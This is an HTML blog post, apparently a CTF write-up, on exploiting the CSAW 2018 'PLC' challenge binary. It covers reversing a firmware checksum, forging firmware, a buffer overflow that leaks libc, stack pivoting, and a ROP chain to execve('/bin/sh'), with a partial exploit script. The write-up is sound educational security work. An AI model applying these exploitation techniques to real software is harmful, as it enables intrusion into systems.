@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>PLC</title>
+
+  
+  
+
+
+
+
+
+<meta name="author" content="betaveros" />
+<meta name="description" content=" We’ve burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines.
+You can access this challenge at https://wargames.ret2.systems/csaw_2018_plc_challenge
+ A much belated post. This is a pwn challenge on a custom online wargaming platform. We are provided with the assembly of what’s ostensibly a programmable logic controller (PLC) for a centrifuge in a nuclear reactor. The challenge looks like it’s still up, so you can take a look and follow along.
+This was the first ROP (okay, spoiler, it’s a ROP) I ever pulled off live during an actual CTF, which I was pretty excited about. The web platform meant I had to worry less about setup, and even though some of the tools it provided were a little lacking (no gdb shortcuts like until, no pwntools utilities for packing/unpacking numbers, … no one_gadget), I think they ultimately made the whole thing a lot more educational for me, so kudos to the folks behind it. I’ve included a brief description of all the exploit techniques that lead up to ROP when we get to that, so hopefully this post will be useful even if you don’t know much about pwning binaries. The prerequisites would be some knowledge with x86 assembly, how executables are loaded into memory, and how to use gdb (or fictionalized web knockoffs thereof).
+
+" />
+
+
+
+
+<meta name="generator" content="Hugo 0.31-DEV" />
+
+
+<link rel="canonical" href="//blog.vero.site/post/plc" />
+<link rel="alternative" href="/index.xml" title="Bounded-Error Log" type="application/atom+xml" />
+
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+
+
+<meta name="robots" content="index,follow" />
+<meta name="referrer" content="origin-when-cross-origin" />
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+<link href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700|Fira+Sans:400,400i,700" rel="stylesheet">
+<link rel="stylesheet" href="/css/bundle.css" />
+<link rel="stylesheet" href="/katex/katex.min.css" />
+
+
+  
+  <!--[if lt IE 9]>
+    <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
+  <![endif]-->
+
+<!--[if lte IE 11]>
+    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
+  <![endif]-->
+
+
+<script src="//cdn.bootcss.com/object-fit-images/3.2.3/ofi.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/smooth-scroll/12.1.4/js/smooth-scroll.polyfills.min.js"></script>
+
+
+</head>
+  <body><div id="wrapper">
+    
+<header class="site-header">
+	
+	<h2 class="title"><a href="/">Bounded-Error Log</a></h2>
+	
+	<p class="subtitle">theoretical and applied randomness by <a href="https://beta.vero.site/">betaveros</a></p>
+	<button class="menu-toggle" type="button" aria-label="Toggle Menu">
+		<span class="icon icon-menu" aria-hidden="true"></span>
+	</button>
+	<nav class="site-menu collapsed">
+		<h2 class="offscreen">Main Menu</h2>
+		<ul class="menu-list">
+			
+			
+			
+			
+			<li class="menu-item "><a href="/about">About</a></li>
+			
+			<li class="menu-item "><a href="/category/life">Life</a></li>
+			
+			<li class="menu-item "><a href="/category/thoughts">Thoughts</a></li>
+			
+			<li class="menu-item "><a href="/category/self-analysis">Self-Analysis</a></li>
+			
+			<li class="menu-item "><a href="/category/math">Math</a></li>
+			
+			<li class="menu-item "><a href="/category/cs">CS</a></li>
+			
+			<li class="menu-item "><a href="/category/puzzles">Puzzles</a></li>
+			
+			<li class="menu-item "><a href="/category/meta">Meta</a></li>
+			
+			<li class="menu-item "><a href="/util">Utilities</a></li>
+			
+		</ul>
+	</nav>
+	<nav class="social-menu collapsed">
+		<h2 class="offscreen">Social Networks</h2>
+		<ul class="social-list">
+
+			
+
+			
+			<li class="social-item">
+				<a href="//github.com/betaveros" title="GitHub" aria-label="GitHub"><span class="icon icon-github" aria-hidden="true"></span></a>
+			</li>
+
+			
+
+			<li class="social-item">
+				<a href="/index.xml" title="RSS" aria-label="RSS"><span class="icon icon-rss" aria-hidden="true"></span></a>
+			</li>
+
+		</ul>
+	</nav>
+</header>
+
+<section class="main post-detail">
+	<header>
+		<h1 class="post-title">PLC</h1>
+		
+		<h2 class="post-subtitle">CSAW CTF Qualifiers 2018</h2>
+		
+		<p class="post-meta">
+		
+		2018-09-30
+		(3590 words)
+		
+		<span class="post-categories">
+			filed under
+			<a href="/category/cs">CS</a>
+		</span>
+		
+		</p>
+	</header>
+	<article><blockquote>
+<p>We’ve burrowed ourselves deep within the facility, gaining access to the programable logic controllers (PLC) that drive their nuclear enrichment centrifuges. Kinetic damage is necessary, we need you to neutralize these machines.</p>
+<p>You can access this challenge at <a href="https://wargames.ret2.systems/csaw_2018_plc_challenge" class="uri">https://wargames.ret2.systems/csaw_2018_plc_challenge</a></p>
+</blockquote>
+<p>A much belated post. This is a pwn challenge on a custom online wargaming platform. We are provided with the assembly of what’s ostensibly a programmable logic controller (PLC) for a centrifuge in a nuclear reactor. The challenge looks like it’s still up, so you can take a look and follow along.</p>
+<p>This was the first <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a> (okay, spoiler, it’s a ROP) I ever pulled off live during an actual CTF, which I was pretty excited about. The web platform meant I had to worry less about setup, and even though some of the tools it provided were a little lacking (no gdb shortcuts like <code>until</code>, no pwntools utilities for packing/unpacking numbers, … no <code>one_gadget</code>), I think they ultimately made the whole thing a lot more educational for me, so kudos to the folks behind it. I’ve included a brief description of all the exploit techniques that lead up to ROP when we get to that, so hopefully this post will be useful even if you don’t know much about pwning binaries. The prerequisites would be some knowledge with x86 assembly, how executables are loaded into memory, and how to use <code>gdb</code> (or fictionalized web knockoffs thereof).</p>
+<p></p>
+<p>The wargaming platform has a sequence of six checkpoints/achievements. The first four are simple enough once you reverse-engineer the assembly, the fifth just requires you to overflow a buffer (although it didn’t tell this to you literally and I actually couldn’t figure out what my goal was at first), but (as you’d expect) the sixth requires you to pop a shell and get the flag, which is ultimately the only thing that mattered for the CTF.</p>
+<h3 id="reversing">Reversing</h3>
+<p>We have C code for the outermost loop of the PLC. In this loop, the PLC accepts one of five single-character commands:</p>
+<ul>
+<li><code>U</code> updates the firmware.</li>
+<li><code>E</code> executes the firmware.</li>
+<li><code>S</code> prints the PLC status.</li>
+<li><code>R</code> resets the PLC.</li>
+<li><code>Q</code> breaks.</li>
+</ul>
+<p>Understanding how to run commands is enough to get the first checkpoint.</p>
+<p>Even though only one character matters, the PLC reads input into a massive buffer <code>char cmd[128] = {}</code> on the stack and then just uses the first character from that. Unfortunately it’s done with a properly <code>fgets</code> with the proper parameters, so we can’t smash the stack here. Still, we’ll see how it’s useful later.</p>
+<p>This is pretty much all we get before we have to start reading assembly. There isn’t too much to say about this; it’s just understanding x86 instructions, making note of memory locations that keep reappearing, and figuring out what they’re used for. There are plenty of debug print statements that tell you what many branches of code do, so once you put some time in, it’s not too hard to figure out what most of the variables are. Most things are statically allocated:</p>
+<ul>
+<li><code>0x202499</code> is a boolean debug flag that causes the code to print additional information.</li>
+<li><code>0x2028a0</code> is a register that holds the RPM of the centrifuges. If the register exceeds <code>0x109a0</code> = 68000, either an alert or failsafe is triggered.</li>
+<li><code>0x2028a4</code> is a <code>0x40</code>-byte buffer that stores the enrichment material as a string. On initialization it is <code>memset</code> to all 0’s and then set to the hardcoded string “<code>&lt;none&gt;</code>”.</li>
+<li><code>0x2028e4</code> is a boolean override flag, which controls whether an alert or a failsafe occurs when the RPM exceeds the dangerous threshold.</li>
+<li><code>0x2028e8</code> is a function pointer to <code>rpm_alert</code>.</li>
+<li><code>0x2028f0</code> is a function pointer to <code>rpm_abort</code>.</li>
+</ul>
+<p>The checkpoints guide you to first reverse <code>update_firmware</code>, which reads in firmware from stdin and then checks in a few ways that the firmware is valid, including a call to a fairly complicated <code>validate_checksum</code>. You can get the checkpoints just by stepping through <code>update_firmware</code> and changing the registers right before each conditional branch that would cause an invalidation, and we did this, but cheating this way won’t ultimately work against prod. Still, if you do this you can quickly get a handle on where the checks are and then it’s not too hard to read them off.</p>
+<p>Let’s see what’s going on in <code>update_firmware</code>. We start by reading from stdin into <code>[rbp-0x410]</code> with this code, which calls <a href="https://en.cppreference.com/w/c/io/fread">fread</a>:</p>
+<pre><code>0xf12:  mov     rdx, qword [rel 0x202490]
+0xf19:  lea     rax, [rbp-0x410]
+0xf20:  mov     rcx, rdx
+0xf23:  mov     edx, 0x400
+0xf28:  mov     esi, 0x1
+0xf2d:  mov     rdi, rax
+0xf30:  call    fread</code></pre>
+<p>As per x86-64 calling convention, the arguments for a function call go in the registers <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, and <code>rcx</code> in that order, so this is <code>fread(rbp-0x410, 0x1, 0x400, *[rel 0x202490])</code>. I don’t actually know what is at <code>[rel 0x202490]</code>, but it’s pretty reasonable to guess that it’s the file pointer to stdin, because what other file pointers are there even? So this reads <code>0x400</code> bytes into memory onto the stack, starting at <code>rbp-0x410</code>.</p>
+<p>Peeking ahead at the success/failure messages tells us that <code>[rbp-0x414]</code> is a failure flag; if it’s 0 then the update succeeds, if it’s nonzero then the update fails.</p>
+<pre><code>0xfcc:  cmp     dword [rbp-0x414], 0x0
+0xfd3:  je      0xfe3
+
+0xfd5:  lea     rdi, [rel 0x15e6]  &quot;FIRMWARE UPDATE FAILED!&quot;
+0xfdc:  call    puts
+0xfe1:  jmp     0xfef
+
+0xfe3:  lea     rdi, [rel 0x15fe]  &quot;FIRMWARE UPDATE SUCCESSFUL!&quot;
+0xfea:  call    puts</code></pre>
+<p>There are four simple checks that are simply conditional branches in <code>update_firmware</code>. The first two check if the first two bytes of the firmware are <code>0x46 = 'F'</code> and <code>0x57 = 'W'</code>, respectively:</p>
+<pre><code>0xf35:  movzx   eax, byte [rbp-0x410]
+0xf3c:  cmp     al, 0x46
+0xf3e:  jne     0xf4b
+
+0xf40:  movzx   eax, byte [rbp-0x40f]
+0xf47:  cmp     al, 0x57
+0xf49:  je      0xf57
+
+0xf4b:  mov     dword [rbp-0x414], 0x1 ; fail!
+0xf55:  jmp     0xfcc
+
+0xf57:  (checks continue)</code></pre>
+<p>Makes sense, FW is short for FirmWare.</p>
+<p>The third and fourth come after the <code>validate_checksum</code> call, but since they’re simple, we’ll get them out of the way first. They check if the fifth and sixth bytes of the firmware are less than <code>0x39 = '9'</code>. If you look ahead to where they’re printed, you’ll see that these bytes are printed as the major and minor version. But they don’t really do anything.</p>
+<pre><code>0xf76:  movzx   eax, byte [rbp-0x40c]
+0xf7d:  movzx   eax, al
+0xf80:  sub     eax, 0x30
+0xf83:  cmp     eax, 0x9
+0xf86:  jg      0xf9a
+
+0xf88:  movzx   eax, byte [rbp-0x40b]
+0xf8f:  movzx   eax, al
+0xf92:  sub     eax, 0x30
+0xf95:  cmp     eax, 0x9
+0xf98:  jle     0xfa6
+
+0xf9a:  mov     dword [rbp-0x414], 0x3
+0xfa4:  jmp     0xfcc</code></pre>
+<p>At the end the updating happens by copying <code>[rbp-0x410]</code> into <code>[rel 0x2024a0]</code>, which is a statically allocated buffer for the firmware. (<code>rep</code> is a weird x86 command prefix that can come before some commands to indicate “repeat them <code>rcx</code> times”; here it modifies <code>movsq</code>, move some number of quad-words, specifically <code>0x80</code> in this case.)</p>
+<pre><code>0xfa6:  mov     eax, 0x0
+0xfab:  call    reset_plc
+0xfb0:  lea     rax, [rel 0x2024a0]
+0xfb7:  lea     rdx, [rbp-0x410]
+0xfbe:  mov     ecx, 0x80
+0xfc3:  mov     rdi, rax
+0xfc6:  mov     rsi, rdx
+0xfc9:  rep movsq qword [rdi], [rsi]</code></pre>
+<p>Anyway, now is a good time to go back and focus on <code>validate_checksum</code>, which we can see is called with a pointer to the freshly read firmware input:</p>
+<pre><code>0xf57:  lea     rax, [rbp-0x410]
+0xf5e:  mov     rdi, rax
+0xf61:  call    validate_checksum
+0xf66:  test    eax, eax
+0xf68:  je      0xf76</code></pre>
+<h3 id="validate_checksum"><code>validate_checksum</code></h3>
+<p>I won’t go into excruciating detail, but here’s a quick play-by-play of how to reverse this function:</p>
+<ul>
+<li><p>The primary loop is bracketed by these commands, which clearly mark <code>[rbp-0xc]</code> as a loop counter, and it is initialized to 2:</p>
+<pre><code>0xe2c:  mov     dword [rbp-0xc], 0x2
+0xe35:  ...
+
+0xe6a:  add     dword [rbp-0xc], 0x1
+0xe6e:  cmp     dword [rbp-0xc], 0x1ff
+0xe75:  jle     0xe35</code></pre></li>
+<li><p>The checks at the end make clear that <code>[rbp-0xe]</code> is the “reported checksum” and <code>[rbp-0x10]</code> is the “actual checksum”:</p>
+<pre><code>0xe82:  movzx   eax, word [rbp-0xe]
+0xe86:  mov     esi, eax
+0xe88:  lea     rdi, [rel 0x1580]  &quot;[DEBUG] REPORTED FW CHECKSUM: %0…&quot;
+0xe8f:  mov     eax, 0x0
+0xe94:  call    printf
+0xe99:  movzx   eax, word [rbp-0x10]
+0xe9d:  mov     esi, eax
+0xe9f:  lea     rdi, [rel 0x15a8]  &quot;[DEBUG]   ACTUAL FW CHECKSUM: %0…&quot;
+0xea6:  mov     eax, 0x0
+0xeab:  call    printf</code></pre></li>
+<li><p>After things hopping thorugh registers a bit more than necessary <code>[rbp-0xe]</code> is read off the third and fourth bytes of the firmware, <code>[rax+0x2]</code>:</p>
+<pre><code>0xe0e:  mov     qword [rbp-0x18], rdi
+0xe12:  mov     rax, qword [rbp-0x18]
+0xe16:  mov     qword [rbp-0x8], rax
+; ...
+0xe20:  mov     rax, qword [rbp-0x8]
+0xe24:  movzx   eax, word [rax+0x2]
+0xe28:  mov     word [rbp-0xe], ax</code></pre>
+<p>Meanwhile, <code>[rbp-0x10]</code> is initialized to 0:</p>
+<pre><code>0xe1a:  mov     word [rbp-0x10], 0x0</code></pre></li>
+<li><p>Finally, the meat of the checksum proceeds two bytes at a time as follows:</p>
+<ul>
+<li><p>The checksum’s nybbles are cycled:</p>
+<pre><code>0xe35:  movzx   eax, word [rbp-0x10]
+0xe39:  shl     eax, 0xc
+0xe3c:  mov     edx, eax
+0xe3e:  movzx   eax, word [rbp-0x10]
+0xe42:  shr     ax, 0x4
+0xe46:  or      eax, edx
+0xe48:  mov     word [rbp-0x10], ax</code></pre>
+<p>This is basically <code>eax = (eax &lt;&lt; 12) | (eax &gt;&gt; 4)</code>.</p></li>
+<li><p>The counter variable of the loop (starting from 2) is added to the checksum:</p>
+<pre><code>0xe4c:  mov     eax, dword [rbp-0xc]
+0xe4f:  add     word [rbp-0x10], ax</code></pre></li>
+<li><p>Finally, two bytes are sliced from the firmware <code>firmware[2*i:2*i+2]</code> and xored into the checksum:</p>
+<pre><code>0xe53:  mov     eax, dword [rbp-0xc]
+0xe56:  cdqe
+0xe58:  lea     rdx, [rax+rax]
+0xe5c:  mov     rax, qword [rbp-0x8]
+0xe60:  add     rax, rdx
+0xe63:  movzx   eax, word [rax]
+0xe66:  xor     word [rbp-0x10], ax</code></pre></li>
+</ul></li>
+</ul>
+<p>A bit involved but nothing terribly complicated. Anyway, armed with this we can write any firmware we want and attach a version, checksum, and prefix <code>FW</code> that the PLC will happily update to. This gets us past checkpoints 2 and 3 without cheating. In vanilla python (no pwntools) it looks like this:</p>
+<pre class="sourceCode python"><code class="sourceCode python"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="co"># Build a length-0x400 firmware with placeholders for the checksum bytes</span></div>
+<div class="sourceLine" id="2" href="#2" data-line-number="2">program <span class="op">=</span> <span class="st">&#39;FWxx99&#39;</span> <span class="op">+</span> <span class="st">&#39;7&#39;</span> <span class="op">*</span> (<span class="bn">0x400</span> <span class="op">-</span> <span class="dv">6</span>)</div>
+<div class="sourceLine" id="3" href="#3" data-line-number="3"></div>
+<div class="sourceLine" id="4" href="#4" data-line-number="4">checksum <span class="op">=</span> <span class="dv">0</span></div>
+<div class="sourceLine" id="5" href="#5" data-line-number="5"><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">2</span>, <span class="bu">len</span>(program)<span class="op">//</span><span class="dv">2</span>):</div>
+<div class="sourceLine" id="6" href="#6" data-line-number="6">    checksum <span class="op">=</span> ((checksum <span class="op">&lt;&lt;</span> <span class="dv">12</span>) <span class="op">|</span> (checksum <span class="op">&gt;&gt;</span> <span class="dv">4</span>)) <span class="op">&amp;</span> <span class="bn">0xffff</span></div>
+<div class="sourceLine" id="7" href="#7" data-line-number="7">    checksum <span class="op">+=</span> i</div>
+<div class="sourceLine" id="8" href="#8" data-line-number="8">    checksum <span class="op">&amp;=</span> <span class="bn">0xffff</span></div>
+<div class="sourceLine" id="9" href="#9" data-line-number="9">    checksum <span class="op">^=</span> (<span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i<span class="op">+</span><span class="dv">1</span>]) <span class="op">&lt;&lt;</span> <span class="dv">8</span>) <span class="op">|</span> <span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i])</div>
+<div class="sourceLine" id="10" href="#10" data-line-number="10"></div>
+<div class="sourceLine" id="11" href="#11" data-line-number="11">program <span class="op">=</span> program[:<span class="dv">2</span>] <span class="op">+</span> <span class="bu">chr</span>(checksum <span class="op">&amp;</span> <span class="bn">0xFF</span>) <span class="op">+</span> <span class="bu">chr</span>((checksum <span class="op">&gt;&gt;</span> <span class="dv">8</span>) <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">+</span> program[<span class="dv">4</span>:]</div></code></pre>
+<h3 id="execute_firmware-and-the-overflow"><code>execute_firmware</code> and the Overflow</h3>
+<p>Now we’re at the meat of the PLC, which executes the firmware as some kind of virtual bytecode. It is very long, so I won’t go into the reversing details, but:</p>
+<ul>
+<li>The instruction pointer is stored at <code>dword [rbp-0x8]</code>.</li>
+<li>The current instruction is stored at <code>byte [rbp-0x9]</code>.</li>
+<li><p>Some of the ASCII characters for digits are legal instructions. Some of them consume the character after them as well. Look for <code>cmp byte [rbp-0x9], 0xsomething</code>. The ones that are really of any interest are:</p>
+<ul>
+<li><code>2</code> followed by a character appends it to the string that represents the material being enriched.</li>
+<li><code>3</code> followed by <code>1</code> enables the override, causing <code>alert</code> to be called when the RPM increases above safe levels, rather than <code>abort</code>.</li>
+<li><code>7</code> increases the RPM.</li>
+<li><code>8</code> followed by <code>1</code> enables the debug flag.</li>
+<li><code>9</code> halts.</li>
+</ul></li>
+</ul>
+<p>Once you go through this, the overflow just jumps right out: there are no bounds checks for the <code>2</code> command! So you can type bytes into the buffer and past its end, right into the following locations in memory. What are they again?</p>
+<blockquote>
+<ul>
+<li><code>0x2028a4</code> is a 40-byte buffer that stores the enrichment material as a string. On initialization it is <code>memset</code> to all 0’s and then set to the hardcoded string “<code>&lt;none&gt;</code>”.</li>
+<li><code>0x2028e4</code> is a boolean override flag, which controls whether an alert or a failsafe occurs when the RPM exceeds the dangerous threshold.</li>
+<li><code>0x2028e8</code> is a function pointer to rpm alert.</li>
+<li><code>0x2028f0</code> is a function pointer to rpm abort.</li>
+</ul>
+</blockquote>
+<p>We have an override flag that nobody will validate and then two function pointers, so we have a controlled function call. In fact, by overflowing the buffer we may as well set the boolean override flag and cause <code>alert</code> to be called instead of <code>abort</code>. Now we can make the program jump to wherever we want it to.</p>
+<p>As a very fast recap of the standard exploits in this case: In the case with the fewest security features, we’d find a way to input shellcode (pre-written x86 instructions that give us a shell) so that it’s written in memory somewhere easily accessible, and then call it. Unfortunately, just about all programs are now compiled with Data Execution Prevention (DEP, aka NX for <em>no-execute</em>), which means sections of memory where we could write anything (like the stack or the data section) are not allowed to be executed. The workaround is to use <em>return-oriented programming</em>, or ROP. This exploit technique assumes that we have a fair amount of control of the stack. To use it, we look through <code>libc</code> (the compiled C standard library, which is large) to find instructions or short sequences of instructions we want to execute that are followed by <code>ret</code> (return, which pops a position off the stack and jumps to it, and which gives the technique its name; these instructions or sequences are called “ROP gadgets”). Then, we jump to the first instruction while the stack is set up so that at the <code>ret</code> at the end of every gadget, the computer will return to the next gadget we want. <code>libc</code> is a section of memory that the computer is OK with executing, so this is fine.</p>
+<p>Whereas normally we’d search for ROP gadgets by running some tool like <code>ROPgadget</code> or <code>one_gadget</code>, the wargames environment has a nice ROP tab where we can enter instructions and it will find them in <code>libc</code> for us. (It can also look in the executable itself, but it’s too small to have many useful ROP gadgets.)</p>
+<h3 id="leaking-libc">Leaking libc</h3>
+<p>We still have to defeat the modern mitigation for ROPping though: Address Space Layout Randomization (ASLR). That is, the addresses of the various segments are randomized during each execution, including where <code>libc</code> is loaded into memory. As a result, when ASLR is on, we don’t know the runtime address of anything in <code>libc</code>. (It is important to note that unlike DEP and some other mitigation techniques, which are properties of the executable that determined by how it’s compiled, whether ASLR is on is a property of the operating system.) However, we can get around this if we manage to get the program to tell us the address of any particular thing in <code>libc</code>, because ASLR only starts each segment at a random position; everything in <code>libc</code> is still in the same relative position to everything else. This is simply called “leaking <code>libc</code>”.</p>
+<p>The buffer overflow makes it easy to leak an address in <code>libc</code>, as the address right after the buffer is actually just a pointer to <code>abort</code>, which is in <code>libc</code>. So if we just overflow right up to the end of the buffer so that there are no longer any null terminators, and we run the <code>S</code> command to print the name, we’ll get a <code>libc</code> address after whatever we wrote in the buffer. Null bytes in the address present a minor issue here since the computer will just stop printing the string, but they are easy to manually fix and compare. My teammate ecnerwal implemented this part, so I didn’t have to worry about it.</p>
+<p>Despite all this, we still don’t have enough to set up a ROP chain <em>per se</em>. Our buffer overflow is in the data segment, not on the stack, so we can’t actually control the return address; we only control a single <code>call</code>. What to do?</p>
+<p>I didn’t know enough about ROP to answer this myself, so I hit up my favorite resource, RPISEC’s <a href="http://security.cs.rpi.edu/courses/binexp-spring2015/">Modern Binary Exploitation course site</a>, and went to the <a href="http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/11/07_lecture.pdf">DEP &amp; ROP lecture slides</a>. The course notes are also a pretty good resource in general for everything I sort of hurriedly talked about in the last couple paragraphs about how to exploit a program where you have control of a jump. I remembered the theory of writing ROP chains and leaking libc to defeat ASLR, but I didn’t remember this last technique:</p>
+<blockquote>
+<ul>
+<li>Typically in modern exploitation you might only get one targeted overwrite rather than a straight stack smash.</li>
+<li>What can you do when you only have one gadget worth of execution?
+<ul>
+<li>Answer: <strong>Stack Pivoting</strong></li>
+</ul></li>
+</ul>
+</blockquote>
+<p>Bingo.</p>
+<h3 id="stack-pivoting">Stack Pivoting</h3>
+<p>Stack pivoting is a technique that’s useful when we only control one call and can only execute one ROP gadget. The idea is that we use our one gadget to move <code>rsp</code> (the stack pointer) somewhere where we can write things. That lets us control more of the stack, including hopefully the return address of our first ROP gadget and of any ROP gadgets after that.</p>
+<p>In fact, that oddly massive buffer <code>char cmd[128] = {}</code> from the start is exactly what we need; it’s just a short distance away from the stack pointer, and we have full control over it.</p>
+<p>Stepping through the program to look at the value of <code>rsp</code> at various points reveals that <code>cmd</code> is just <code>0x28</code> away from the stack pointer in the call that we control. We don’t want to pivot to exactly the start of <code>cmd</code> because we need to specify the PLC command with the first character, so we want to pivot to a little bit past it, as little as possible so that we have ample stack space.</p>
+<p>Going into the ROP tab and searching up <code>add rsp</code> gives the gadget <code>add rsp, 0x38</code> at <code>0xc9616</code>. Calling this will pivot the stack to <code>cmd + 0x10</code>, at which point we can set up a full ROP chain.</p>
+<p>We don’t need to be very creative with the ROP payload; we just want to call the syscall <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>, which gives us a shell. (The last two arguments for <code>execve</code> are arrays of arguments and environment variables for the executable; we just want them to be NULL so nothing weird happens.) Your search engine of choice will tell you that (on a 64-bit machine) <code>execve</code> is syscall number 59, or <code>0x3b</code>. After looking for ROP gadgets that we want, we decide that we want to set up the stack like this (top to bottom), where parentheses denote the location of the ROP gadget:</p>
+<pre><code>(pop rax ; ret)
+0x3b
+(pop rdi ; ret)
+(pointer to &quot;/bin/sh&quot;)
+(pop rdx ; pop rsi ; ret)
+0
+0
+(syscall)</code></pre>
+<p>With ASLR off (there’s a little toggle slider in the wargaming platform’s settings menu), we can hardcode the actual addresses these instructions will be found at by looking at the addresses printed by the <code>vmmap</code> command. For example, the ROP tab says <code>pop rax ; ret</code> is found at <code>0x0000000000033544</code>, and libc starts at <code>0x7f0000228000</code>.</p>
+<pre><code>0x7f0000228000-0x7f00003e8000 r-x 2.23-0ubuntu10</code></pre>
+<p>So at runtime the <code>pop rax ; ret</code> gadget will be at the address <code>0x7f0000228000 + 0x33544</code>. With ASLR on, we just take this and add the difference between the old address of <code>abort</code> in <code>libc</code> (which turned out to be <code>0x7f000025eec0</code>), collected and hardcoded into our exploit when ASLR was off, and the new one recently leaked during the current run. The same thing is done with <code>&quot;/bin/sh&quot;</code>, which can be found in libc using the debugger’s <code>find</code> command.</p>
+<p>Our finished exploit, to be pasted in the wargaming environment’s Python window, looks as follows. It’s not the prettiest code and there are definitely a lot of improvements I would make now — for example, although we don’t have pwntools’ packing and unpacking functions, Python’s built-in <code>struct</code> module has functions that we can use with just a little finagling.</p>
+<pre class="sourceCode python"><code class="sourceCode python"><div class="sourceLine" id="1" href="#1" data-line-number="1"><span class="im">import</span> interact</div>
+<div class="sourceLine" id="2" href="#2" data-line-number="2"></div>
+<div class="sourceLine" id="3" href="#3" data-line-number="3">p <span class="op">=</span> interact.Process()</div>
+<div class="sourceLine" id="4" href="#4" data-line-number="4"><span class="cf">for</span> _ <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">5</span>):</div>
+<div class="sourceLine" id="5" href="#5" data-line-number="5">    p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</div>
+<div class="sourceLine" id="6" href="#6" data-line-number="6"></div>
+<div class="sourceLine" id="7" href="#7" data-line-number="7"><span class="kw">def</span> run_firmware(program, execute_cmd<span class="op">=</span><span class="st">&#39;E&#39;</span>, last_rd<span class="op">=</span><span class="va">True</span>):</div>
+<div class="sourceLine" id="8" href="#8" data-line-number="8">    program <span class="op">=</span> <span class="st">&#39;FWxx99&#39;</span> <span class="op">+</span> program <span class="op">+</span> <span class="st">&#39;9&#39;</span> <span class="op">*</span> <span class="bn">0x400</span></div>
+<div class="sourceLine" id="9" href="#9" data-line-number="9">    program <span class="op">=</span> program[:<span class="bn">0x400</span>]</div>
+<div class="sourceLine" id="10" href="#10" data-line-number="10"></div>
+<div class="sourceLine" id="11" href="#11" data-line-number="11">    checksum <span class="op">=</span> <span class="dv">0</span></div>
+<div class="sourceLine" id="12" href="#12" data-line-number="12">    <span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">2</span>, <span class="bu">len</span>(program)<span class="op">//</span><span class="dv">2</span>):</div>
+<div class="sourceLine" id="13" href="#13" data-line-number="13">        checksum <span class="op">=</span> ((checksum <span class="op">&lt;&lt;</span> <span class="dv">12</span>) <span class="op">|</span> (checksum <span class="op">&gt;&gt;</span> <span class="dv">4</span>)) <span class="op">&amp;</span> <span class="bn">0xffff</span></div>
+<div class="sourceLine" id="14" href="#14" data-line-number="14">        checksum <span class="op">+=</span> i</div>
+<div class="sourceLine" id="15" href="#15" data-line-number="15">        checksum <span class="op">&amp;=</span> <span class="bn">0xffff</span></div>
+<div class="sourceLine" id="16" href="#16" data-line-number="16">        checksum <span class="op">^=</span> <span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i]) <span class="op">|</span> <span class="bu">ord</span>(program[<span class="dv">2</span><span class="op">*</span>i<span class="op">+</span><span class="dv">1</span>]) <span class="op">&lt;&lt;</span> <span class="dv">8</span></div>
+<div class="sourceLine" id="17" href="#17" data-line-number="17">    program <span class="op">=</span> (program[:<span class="dv">2</span>] <span class="op">+</span> <span class="bu">chr</span>(checksum <span class="op">&amp;</span> <span class="bn">0xff</span>)</div>
+<div class="sourceLine" id="18" href="#18" data-line-number="18">        <span class="op">+</span> <span class="bu">chr</span>((checksum <span class="op">&gt;&gt;</span> <span class="dv">8</span>) <span class="op">&amp;</span> <span class="bn">0xff</span>) <span class="op">+</span> program[<span class="dv">4</span>:])</div>
+<div class="sourceLine" id="19" href="#19" data-line-number="19"></div>
+<div class="sourceLine" id="20" href="#20" data-line-number="20">    p.sendline(<span class="st">&#39;U&#39;</span>)</div>
+<div class="sourceLine" id="21" href="#21" data-line-number="21">    p.sendline(program)</div>
+<div class="sourceLine" id="22" href="#22" data-line-number="22">    p.flush()</div>
+<div class="sourceLine" id="23" href="#23" data-line-number="23">    p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</div>
+<div class="sourceLine" id="24" href="#24" data-line-number="24">    p.sendline(execute_cmd)</div>
+<div class="sourceLine" id="25" href="#25" data-line-number="25">    p.flush()</div>
+<div class="sourceLine" id="26" href="#26" data-line-number="26">    <span class="cf">if</span> last_rd: p.readuntil(<span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)</div>
+<div class="sourceLine" id="27" href="#27" data-line-number="27"></div>
+<div class="sourceLine" id="28" href="#28" data-line-number="28"><span class="kw">def</span> write_material(mat):</div>
+<div class="sourceLine" id="29" href="#29" data-line-number="29">    run_firmware(<span class="st">&#39;&#39;</span>.join(<span class="st">&#39;2&#39;</span><span class="op">+</span>c <span class="cf">for</span> c <span class="kw">in</span> mat))</div>
+<div class="sourceLine" id="30" href="#30" data-line-number="30"></div>
+<div class="sourceLine" id="31" href="#31" data-line-number="31"><span class="kw">def</span> read_material():</div>
+<div class="sourceLine" id="32" href="#32" data-line-number="32">    p.sendline(<span class="st">&#39;S&#39;</span>)</div>
